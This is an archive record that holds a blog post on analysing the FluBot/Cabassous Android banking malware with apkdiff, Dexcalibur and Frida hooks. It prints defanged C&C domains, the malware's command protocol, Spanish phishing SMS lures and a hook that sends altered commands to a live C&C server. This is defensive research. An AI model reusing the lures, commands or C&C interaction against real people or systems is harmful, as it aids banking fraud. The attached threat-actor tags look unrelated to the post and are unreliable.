{
    "id": "7c75792d-3f1c-4abb-8583-e029839bfdca",
    "created_at": "2023-01-12T15:05:44.824426Z",
    "updated_at": "2025-03-27T02:16:26.090112Z",
    "deleted_at": null,
    "sha1_hash": "612402a61d2880660041dc1d980963bc800ef049",
    "title": "2021-04-19 - How to analyze mobile malware- a Cabassous-FluBot Case study",
    "authors": "",
    "file_creation_date": "2022-05-27T21:27:11Z",
    "file_modification_date": "2022-05-27T21:27:11Z",
    "file_size": 2560795,
    "plain_text": "# How to analyze mobile malware: a Cabassous/FluBot Case study\n\n**[blog.nviso.eu/2021/04/19/how-to-analyze-mobile-malware-a-cabassous-flubot-case-study/](https://blog.nviso.eu/2021/04/19/how-to-analyze-mobile-malware-a-cabassous-flubot-case-study/)**\n\nApril 19, 2021\n\nThis blogpost explains all the steps I took while analyzing the Cabassous/FluBot malware. I\nwrote this while analyzing the sample and Iâ€™ve written down both successful and failed\nattempts at moving forward, as well as my thoughts/options along the way. As a result, this\nblogpost is not a writeup of the Cabassous/FluBot malware, but rather a step-by-step guide\non how you can examine the malware yourself and what the thought process can be behind\nexamining mobile malware. Finally, itâ€™s worth mentioning that all the tools used in this\nanalysis are open-source / free.\n\nIf you want a straightforward writeup of the malwareâ€™s capabilities, thereâ€™s an excellent\n[technical write up by ProDaft (pdf) and a writeup by Aleksejs Kuprins with more background](https://raw.githubusercontent.com/prodaft/malware-ioc/master/FluBot/FluBot.pdf)\ninformation and further analysis. I knew these existed before writing this blogpost, but\ndeliberately chose not to read them first as I wanted to tackle the sample â€˜blindâ€™.\n\n**Our goal: Intercept communication between the malware sample and the C&C and**\n**figure out which applications are being attacked.**\n\n## The sample\n\nCabassous/FluBot recently popped up in Europe where it is currently expanding quite\nrapidly. The sample I examined is attacking Spanish mobile banking applications, but\n[German,](https://twitter.com/lukasstefanko/status/1373212991903125506?lang=en) [Italian and](https://twitter.com/0xabc0/status/1381705290870034432) [Hungarian versions have been spotted recently as well.](https://twitter.com/LukasStefanko/status/1374710032944799747)\n\n[In this post, weâ€™ll be taking a look at this sample](https://www.virustotal.com/gui/file/acb38742fddfc3dcb511e5b0b2b2a2e4cef3d67cc6188b29aeb4475a717f5f95/detection)\n( acb38742fddfc3dcb511e5b0b2b2a2e4cef3d67cc6188b29aeb4475a717f5f95 ). Iâ€™ve also\nuploaded this sample to the Malware Bazar website if you want to follow along.\n\n\n-----\n\n**This is live malware**\n\nNote that this is live malware and you should never install this on a device which contains\nsensitive information.\n\n## Starting with some static analysis\n\nI usually make the mistake of directly going to dynamic analysis without some recon first, so\nthis time I wanted to start things slow. It also takes some time to reset my phone after it has\nbeen infected, so I wanted to get the most out of my first install by placing Frida hooks where\nnecessary.\n\n### First steps\n\nThe first thing to do is find the starting point of the application, which is listed in the\nAndroidManifest:\n```\n<activity android:name=\"com.tencent.mobileqq.MainActivity\">\n      <intent-filter>\n        <action android:name=\"android.intent.action.MAIN\"/>\n        <category android:name=\"android.intent.category.LAUNCHER\"/>\n      </intent-filter>\n    </activity>\n    <activity android:name=\"com.tencent.mobileqq.IntentStarter\">\n      <intent-filter>\n        <action android:name=\"android.intent.action.MAIN\"/>\n      </intent-filter>\n    </activity>\n\n```\nSo we need to find `com.tencent.mobileqq.MainActivity . After opening the sample with`\n[Bytecode Viewer, there unfortunately isnâ€™t a com.tencent.mobileqq package. There are](https://github.com/Konloch/bytecode-viewer)\nhowever a few other interesting things that Bytecode Viewer shows:\n\n\n-----\n\nThereâ€™s a `classes-v1.bin file in a folder called â€˜dexâ€™. While this file probably`\ncontains dex bytecode, it currently isnâ€™t identified by the `file utility and is probably`\nencrypted.\nThere is a `com.whatsapp package with what appear to be legitimate WhatsApp`\nclasses\nThere are three top-level packages that are suspicious: `n,` `np and` `obfuse`\nThereâ€™s a `libreactnativeblob.so which probably belongs to WhatsApp as well`\n\n### Comparing the sample to WhatsApp\n\nSo it seems that the malware authors repackaged the official WhatsApp app and added their\nmalicious functionality. Now that we know that, we can compare this sample to the official\nWhatsApp app and see if any functionality was added in the com.whatsapp folder. A good\n[tool for comparing apks is apkdiff.](https://github.com/daniellockyer/apkdiff)\n\n**Which version to compare to?**\n\nI first downloaded the latest version of WhatsApp from the Google Play store, but there were\nway too many differences between that version and the sample. After digging around the\ncom.whatsapp folder for a bit, I found the AbstractAppShell class which contains a version\nidentifier: `2.21.3.19-play-release . A quick google search leads us to apkmirror which`\nhas older versions for download.\n\n\n-----\n\nSo letâ€™s compare both versions using apkdiff:\n```\npython3 apkdiff.py ../com.whatsapp_2.21.3.19-210319006_minAPI16\\(x86\\)\\\n(nodpi\\)_apkmirror.com.apk ../Cabassous.apk\n\n```\nBecause the malware stripped all the resource files from the original WhatsApp apk, apkdiff\nidentifies 147 files that were modified. To reduce this output, I added â€˜xmlâ€™ to the ignore list of\napkdiff.py on line 14:\n```\nat = \"at/\"\nignore = \".*(align|apktool.yml|pak|MF|RSA|SF|bin|so|xml)\"\ncount = 0\n\n```\nAfter running apkdiff again, the output is much shorter with only 4 files that are different. All of\nthem differ in their labeling of try/catch statements and are thus not noteworthy.\n\n\n-----\n\n**Somethingâ€™s missingâ€¦**\n\nItâ€™s pretty interesting to see that apkdiff doesnâ€™t identify the `n,` `np and` `obfuse` packages.\nI would have expected them to show up as being added in the malware sample, but\napparently apkdiff only compares files that exist in both apks.\n\nAdditionally, apkdiff did not identify the encrypted dex file ( classes-v1.bin ). This is\nbecause, by default, apkdiff.py ignores files with the .bin extension.\nSo to make sure no other files were added, we can run a normal diff on the two smali folders\nafter having used `apktool to decompile them:`\n```\ndiff -rq Cabassous com.whatsapp_2.21.3.19-210319006_minAPI16\\(x86\\)\\\n(nodpi\\)_apkmirror.com | grep -i \"only in Cabassous/smali\"\n\n```\nIt looks like no other classes/packages were added, so we can start focusing on the `n,` `np`\nand `obfuse packages.`\n\n### Examining the obfuscated classes\n\n\n-----\n\nWe still need to find the `com.tencent.mobileqq.MainActivity class and it s probably`\ninside the encrypted classes-v1.bin file. The com.tencent package name also tells us that the\napplication has probably been packaged with the tencent packer. Letâ€™s use [APKiD to see if it](https://github.com/rednaga/APKiD)\ncan detect the packer:\n\nNot much help there; it only tells us that the sample has been obfuscated but it doesnâ€™t say\nwith which packer. Most likely the tencent packer was indeed used, but it was then\nobfuscated with a tool unknown to APKiD.\n\nSo letâ€™s take a look at those three packages that were added ourselves. Our main goal is to\nfind any references to `System.load or` `DexClassLoader, but after scrolling through the`\nfiles using different decompilers in Bytecode Viewer, I couldnâ€™t really find any. The classes\nuse string obfuscation, control flow obfuscation and many of the decompilers are unable to\ndecompile entire sections of the obfuscated classes.\n\nThere are however quite some imports for Java reflection classes, so the class and method\nnames are probably constructed at runtime.\n\n\n-----\n\nWe could tackle this statically, but that s a lot of work. The unicode names are also pretty\nannoying, and I couldnâ€™t find a script that deobfuscates these, apart from the Pro version of\nthe JEB decompiler. At this point, it would be better to move onto dynamic analysis and use\nsome create Frida hooks to figure out whatâ€™s happening. But thereâ€™s one thing we need to\nsolve firstâ€¦\n\n### How is the malicious code triggered?\n\nHow does the application actually trigger the obfuscated functionality? Itâ€™s not inside the\nMainActivity (which doesnâ€™t even exist yet), which is the first piece of code that will be\nexecuted when launching the app. Well, this is a trick thatâ€™s often used by malware to hide\nfunctionality or to perform anti-debugging checks before the application actually starts.\nBefore Android calls the MainActivityâ€™s `onCreate` method, all required classes are loaded\ninto memory. After they are loaded in memory, all [Static Initialization Blocks are executed.](https://docs.oracle.com/javase/tutorial/java/javaOO/initial.html)\nAny class can have one of these blocks, and they are all executed before the application\nactually starts.\n\nThe application contains many of these static initializers, both in the legitimate com.whatsapp\nclasses and in the obfuscated classes:\n\nMost likely, the classes-v1.bin file gets decrypted and loaded in one of the static initialization\nblocks, so that Android can then find the `com.tencent.mobileqq.MainActivity and call`\nits onCreate method.\n\n## On to Dynamic Analysisâ€¦\n\nThe classes-v1.bin file will need to be decrypted and then loaded. Since we are missing\nsome classes, and since the file is inside a â€˜dexâ€™ folder, itâ€™s a pretty safe bet that it would\ndecrypt to a dex file. That dex file then needs to be loaded using the DexClassLoader. A tool\n[thatâ€™s perfect for the job here is Dexcalibur by](https://github.com/FrenchYeti/dexcalibur) [@FrenchYeti. Dexcalibur allows us to easily](https://twitter.com/FrenchYeti)\n[hook many interesting functions using Frida and is specifically aimed at apps that use](https://frida.re/)\nreflection and dynamic loading of classes.\n\n\n-----\n\nFor my dynamic testing, I ve installed LineageOS + TWRP on an old Nexus 5, I ve installed\n[Magisk,](https://github.com/topjohnwu/Magisk) [MagiskTrustUserCerts and Magisk Frida Server. I also installed ProxyDroid and](https://github.com/NVISOsecurity/MagiskTrustUserCerts)\nconfigured it to connect to my Burp Proxy. Finally, I installed Burpâ€™s certificate, made sure\neverything was working and then performed a backup using TWRP. This way, I can easily\nrestore my device to a clean state and run the malware sample again and again for the first\ntime. Since the malware doesnâ€™t affect the /system partition, I only need to restore the /data/\npermission. You could use an emulator, but not all malware will have x86 binaries and,\nfurthermore, emulators are easily detected. There are certainly drawbacks as well, such as\nthe restore taking a few minutes, but itâ€™s currently fast enough for me to not be annoyed by it.\n\n**Resetting a device is easy with TWRP**\n\nMaking and restoring backups is pretty straightforward in TWRP. You first boot into TWRP by\nexecuting â€˜ adb reboot recovery â€˜. Each phone also has specific buttons you can press\nduring boot, but using adb is much more nicer and consistent.\nIn order to create a backup, go to Backup and select the partitions you want to create a\nbackup of. In this case, we should do `System,` `Data and` `Boot . Slide the slider at the`\nbottom to the right and wait for the backup to finish.\nIn order to restore a backup, go to Restore and select the backup you created earlier. You\ncan choose which partitions you want to restore and then swipe the slider to the right again.\n\nAfter [setting up a device and creating a project, we can start analyzing. Unfortunately, the](https://braincoke.fr/blog/2021/03/android-reverse-engineering-for-beginners-dexcalibur/#about-dexcalibur)\nlatest version of Dexcalibur wasnâ€™t too happy with the SMALI code inside the sample. Some\n[lines have whitespace where it isnâ€™t supposed to be, and there are a few illegal constructions](https://github.com/FrenchYeti/dexcalibur/issues/49)\nusing array definitions and goto labels. Both of them were fixed within 24 hours of reporting\nwhich is very impressive!\n\n**When something doesnâ€™t workâ€¦**\n\nAlmost all the tools we use in mobile security are free and/or open source. When something\ndoesnâ€™t work, you can either find another tool that does the job, or dig into the code and\nfigure out exactly why itâ€™s not working. Even by just reporting an issue with enough\ninformation, youâ€™re contributing to the project and making the tools better for everyone in the\nfuture. So donâ€™t hesitate to do some debugging!\n\nSo after pulling the latest code (or making some quick hotpatches) we can run the sample\nusing dexcalibur. All hooks will be enabled by default, and when running the malware\nDexcalibur lists all of the reflection API calls that we saw earlier:\n\n\n-----\n\nWe can see that some visual components are created, which corresponds to what we see on\nthe device, which is the malware asking for accessibility permissions.\n\n\n-----\n\nAt this point, one of the items in the hooks log should be the dynamic loading of the\ndecrypted dex file. However, thereâ€™s no such call and this actually had me puzzled for a little\nwhile. I thought maybe there was another bug in Dexcalibur, or maybe the sample was using\na class or method not covered by Dexcaliburâ€™s default list of hooks, but none of this turns out\nto be the case.\n\n### Frida is too late ðŸ™\n\nFrida scripts only run when the runtime is ready to start executing. At that point, Android will\nhave loaded all the necessary classes but hasnâ€™t started execution yet. However, static\ninitializers are run during the initialization of the classes which is before Frida hooks into the\nAndroid Runtime. Thereâ€™s [one issue reported about this on the Frida GitHub repository but it](https://github.com/frida/frida-java-bridge/issues/62)\nwas closed without any remediation. There are a few ways forward now:\n\nWe manually reverse engineer the obfuscated code to figure out when the dex file is\nloaded into memory. Usually, malware will remove the file from disk as soon as it is\nloaded in memory. We can then remove the function that removes the decrypted dex\nfile and simply pull it from the device.\n\n\n-----\n\nWe dive into the smali code and modify the static initializers to normal static functions\nand call all of them from the MainActivity.onCreate method. However, since the Activity\ndefined in the manifest is inside the encrypted dex file, we would have to update the\nmanifest as well, otherwise Android would complain that it canâ€™t find the main activity as\nit hasnâ€™t been loaded yet. A real chicken/egg problem.\nMost (all?) methods can be decompiled by at least one of the decompilers in Bytecode\nViewer, and there arenâ€™t too many methods, so we could copy everything over to a new\nAndroid project and simply debug the application to figure out what is happening. We\ncould also trick the new application to decrypt the dex file for us.\n\nButâ€¦. None of that is necessary. While figuring out why the hooks werenâ€™t called, I took a\nlook at the applicationâ€™s storage and after the sample has been run once, it actually doesnâ€™t\ndelete the decrypted dex file and simply keeps it in the app folder.\n\nSo we can copy it off the device by moving it to a world-readable location and making the file\nworld-readable as well.\n```\nkali > adb shell\nhammerhead:/ $ su\nhammerhead:/ # cp /data/data/com.tencent.mobileqq/app_apkprotector_dex\n/data/local/tmp/classes-v1.bin\nhammerhead:/ # chmod 666 /data/local/tmp/classes-v1.bin\nhammerhead:/ # exit\nhammerhead:/ $ exit\nkali > adb pull /data/local/tmp/classes-v1.bin payload.dex\n/data/local/tmp/classes-v1.bin: 1 file pulled. 18.0 MB/s (3229988 bytes in 0.171s)\n\n```\nBut now that weâ€™ve got the malware running, letâ€™s take a quick look at Burp. Our goal is to\nintercept C&C traffic, so we might already be done!\n\n\n-----\n\nWhile we are indeed intercepting C&C traffic, everything seems to be encrypted, so weâ€™re not\ndone just yet.\n\n## â€¦ and back to static\n\nSince we now have the decrypted dex file, letâ€™s open it up in Bytecode Viewer again:\n\n\n-----\n\nThe payload doesn t have any real anti-reverse engineering stuff, apart from some string\nobfuscation. However, all the class and method names are still there and itâ€™s pretty easy to\nunderstand most functionality. Based on the class names inside the com.tencent.mobileqq\npackage we can see that the sample can:\n\nPerform overlay attacks ( BrowserActivity.class )\nStart different intens ( IntentStarter.class )\nLaunch an accessibility service ( MyAccessibilityService.class )\nCompose SMS messages ( ComposeSMSActivity )\netcâ€¦\n\nThe string obfuscation is inside the `io.michaelrocks.paranoid package`\n( Deobfuscator$app$Release.class ) and the [source code is available online.](https://github.com/MichaelRocks/paranoid)\n\nAnother interesting class is `DGA.class which is responsible for the Domain Generation`\nAlgorithm. By using a DGA, the sample cannot be taken down by sink-holing the C&Câ€™s\ndomain. We could reverse engineer this algorithm, but thatâ€™s not really necessary as the\nsample can just do it for us. At this point we also donâ€™t really care which domain it actually\nends up connecting to. We can actually see the DGA in action in Burp: Before the sample is\nable to connect to a legitimate C&C it tries various different domain names (requests 46 â€“\n56), after which it eventually finds a C&C that it likes (requests 57 â€“ 60):\n\n\n-----\n\nSo the payloads are encrypted/obfuscated and we need to figure out how that s done. After\nbrowsing through the source a bit, we can see that the class thatâ€™s responsible for actually\ncommunicating with the C&C is the `PanelReq class. There are a few methods involving`\nencryption and decryption, but thereâ€™s also one method called â€˜Sendâ€™ which takes two\nparameters and contains references to HTTP related classes:\n```\npublic static String Send(String paramString1, String paramString2)\n{\n  try\n  {\n    HttpCom localHttpCom = new com/tencent/mobileqq/HttpCom;\n    localHttpCom.<init>();\n    localHttpCom.SetPort(80);\n    localHttpCom.SetHost(paramString1);\n    localHttpCom.SetPath(Deobfuscator.app.Release.getString(-37542252460644L));\n    paramString1 = Deobfuscator.app.Release.getString(-37585202133604L);\n\n```\nWe can be pretty sure that â€˜paramString1â€™ is the hostname which is generated by the DGA.\nThe second string is not immediately added to the HTTP request and various cryptographic\nfunctions are applied to it first. This is a strong indication that paramString2 will not be\nencrypted when it enters the Send method. Letâ€™s hook the Send method using Frida to see\nwhat it contains.\n\nThe following Frida script contains a hook for the `PanelReq.Send() method:`\n```\nJava.perform(function(){\n  var PanelReqClass = Java.use(\"com.tencent.mobileqq.PanelReq\");\n  PanelReqClass.Send.overload('java.lang.String',\n'java.lang.String').implementation = function(hostname, payload){\n    console.log(\"hostname:\"+hostname);\n    console.log(\"payload:\"+payload);\n    var retVal = this.Send(hostname, payload);\n    console.log(\"Response:\" + retVal)\n    console.log(\"------\");\n    return retVal;\n  }\n});\n\n```\nAdditionally, we can hook the Deobfuscator.app.Release.getString method to figure out\nwhich strings are returned after decrypting them, but in the end this wasnâ€™t really necessary:\n```\nvar Release = Java.use(\"io.michaelrocks.paranoid.Deobfuscator$app$Release\");\nRelease.getString.implementation = function (id){\n  var retVal = this.getString(id);\n  console.log(id + \" > \" + retVal);\n  console.log(\"---\")\n  return retVal;\n}\n\n## Monitoring C&C traffic\n\n```\n\n-----\n\nAfter performing a reset of the device and launching the sample with Frida and the\noverloaded Send method, we get the following output:\n\n\n-----\n\n```\n...\nhostname:vtcslaabqljbnco[.]com\npayload:PREPING,\nResponse:null\n-----hostname:urqisbcliipfrac[.]com\npayload:PREPING,\nResponse:null\n-----hostname:vloxaloyfmdqxti[.]ru\npayload:PREPING,\nResponse:OK\n-----hostname:cjcpldfquycghnf[.]ru\npayload:PREPING,\nResponse:null\n-----Response:nullhostname:vloxaloyfmdqxti[.]ru\npayload:PING,3.4,10,LGE,Nexus 5,en,127,\nResponse:\n-----hostname:vloxaloyfmdqxti.ru\npayload:SMS_RATE\nResponse: 10\n-----hostname:vloxaloyfmdqxti[.]ru\npayload:GET_INJECTS_LIST,com.google.android.carriersetup,org.lineageos.overlay.accent.\nResponse:\n-----hostname:vloxaloyfmdqxti[.]ru\npayload:LOG,AMI_DEF_SMS_APP,1\nResponse:OK\n-----hostname:vloxaloyfmdqxti[.]ru\npayload:GET_SMS\nResponse:648516978,Capi: El envio se ha devuelto dos veces al centro mas cercano\ncodigo: AMZIPH1156020 \n http://chiangma[...].com/track/?sl6zxys4ifyp\n-----hostname:vloxaloyfmdqxti[.]ru\npayload:GET_SMS\nResponse:634689547,No hemos dejado su envio 01101G573629 por estar ausente de su\ndomicilio. Vea las opciones: \n http://chiangma[...].com/track/?7l818osbxj9f\n-----hostname:vloxaloyfmdqxti[.]ru\npayload:GET_SMS\nResponse:699579720,Hola, no te hemos localizado en tu domicilio. Coordina la entrega\nde tu envio 279000650 aqui: \n http://chiangma[...].com/track/?uk5imbr210yue\n-----hostname:vloxaloyfmdqxti[.]ru\npayload:LOG,AMI_DEF_SMS_APP,0\nResponse:OK\n\n```\n\n-----\n\n```\nhostname:vloxaloyfmdqxti[.]ru\npayload:PING,3.4,10,LGE,Nexus 5,en,197,\nResponse:\n-----...\n\n```\nSome observations:\n\nThe sample starts with querying different domains until it finds one that answers â€˜OKâ€™\n(Line 14). This confirms with what we saw in Burp.\nIt sends a list of all installed applications to see which applications to attack using an\noverlay (Line 27). Currently, no targeted applications are installed, as the response is\nempty\nMultiple premium text messages are received (Lines 36, 41, 46, â€¦)\n\nPackage names of targeted applications are sometimes included in the apk, or a full list is\nreturned from the C&C and compared locally. In this sample thatâ€™s not the case and we\nactually have to start guessing. There doesnâ€™t appear to be a list of financial applications\navailable online (or at least, I didnâ€™t find any) so I basically copied all the targeted\n[applications from previous malware writeups and combined them into one long list. This does](https://gist.github.com/TheDauntless/c63221d35d0b3992352c9c724d4688b5)\nnot guarantee that we will find all the targeted applications, but it should give us pretty good\ncoverage.\n\nIn order to interact with the C&C, we can simply modify the Send hook to overwrite the\npayload. Since the sample is constantly polling the C&C, the method is called repeatedly and\nany modifications are quickly sent to the server:\n```\nJava.perform(function(){\n  var PanelReqClass = Java.use(\"com.tencent.mobileqq.PanelReq\");\n  PanelReqClass.Send.overload('java.lang.String',\n'java.lang.String').implementation = function(hostname, payload){\n   var injects=\"GET_INJECTS_LIST,alior.banking[...]zebpay.Application,\"\n   if(payload.split(\",\")[0] == \"GET_INJECTS_LIST\"){\n     payload=injects\n   }\n   console.log(\"hostname:\"+hostname);\n   console.log(\"payload:\"+payload);\n   var retVal = this.Send(hostname, payload);\n   console.log(\"Response:\" + retVal)\n   console.log(\"------\");\n   return retVal;\n  }\n});\n\n```\nFrida also automatically reloads scripts if it detects a change, so we can simply update the\nSend hook with new commands to try out and it will automatically be picked up.\n\n\n-----\n\nBased on the very long list of package names I submitted, the following response was\nreturned by the server to say which packages should be attacked:\n```\n----hostname:vloxaloyfmdqxti[.]ru\npayload:GET_INJECTS_LIST,alior.banking[...]zebpay.Application\nResponse:com.bankinter.launcher,com.bbva.bbvacontigo,com.binance.dev,com.cajasur.andro\n----\n```\nWhen the sample receives the list of applications to attack, it immediately begins sending the\nGET_INJECT command to get a HTML page for each targeted application:\n```\n--hostname:vloxaloyfmdqxti[.]ru\npayload:GET_INJECT,es.evobanco.bancamovil\nResponse:<!DOCTYPE html>\n<html>\n<head>\n  <title>evo</title>\n  <link rel=\"shortcut icon\" href=\"es.evobanco.bancamovil.png\" type=\"image/png\">\n  <meta charset=\"utf-8\">\n....\n\n```\nIn order to view the different overlays, we can modify the Frida script to save the serverâ€™s\nresponse to an HTML file:\n```\nif(payload.split(\",\")[0] == \"GET_INJECT\"){\n    var file = new File(\"/data/data/com.tencent.mobileqq/\"+payload.split(\",\")[1] +\n\".html\",\"w\");\n    file.write(retVal);\n    file.close();\n}\n\n```\nWe can then extract them from the device, open them in Chrome, take some screenshots\nand end up with a nice collage:\n\n\n-----\n\n## Conclusion\n\nThe sample we examined in this post is pretty basic. The initial dropper made it a little bit\ndifficult, but since the decrypted payload was never removed from the application folder, it\nwas easy to extract and analyze. The actual payload uses a bit of string obfuscation but is\nvery easy to understand.\n\nThe communication with the C&C is encrypted, and by hooking the correct method with Frida\nwe donâ€™t even have to figure out how the encryption works. If you want to know how it works\n[though, be sure to check out the technical writeups by ProDaft (pdf) and](https://raw.githubusercontent.com/prodaft/malware-ioc/master/FluBot/FluBot.pdf) [Aleksejs Kuprins.](https://medium.com/csis-techblog/the-brief-glory-of-cabassous-flubot-a-private-android-banking-botnet-bc2ed7917027)\n\nJeroen Beckers\nJeroen Beckers is a mobile security expert working in the NVISO Software and Security\nassessment team. He is a SANS instructor and SANS lead author of the SEC575 course.\nJeroen is also a co-author of OWASP Mobile Security Testing Guide (MSTG) and the\nOWASP Mobile Application Security Verification Standard (MASVS). He loves to both\nprogram and reverse engineer stuff.\n\n[LinkedIn](https://www.linkedin.com/in/beckersjeroen/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-19 - How to analyze mobile malware- a Cabassous-FluBot Case study.pdf"
    ],
    "report_names": [
        "2021-04-19 - How to analyze mobile malware- a Cabassous-FluBot Case study.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535944,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653686831,
    "ts_modification_date": 1653686831,
    "files": {
        "pdf": "https://archive.orkl.eu/612402a61d2880660041dc1d980963bc800ef049.pdf",
        "text": "https://archive.orkl.eu/612402a61d2880660041dc1d980963bc800ef049.txt",
        "img": "https://archive.orkl.eu/612402a61d2880660041dc1d980963bc800ef049.jpg"
    }
}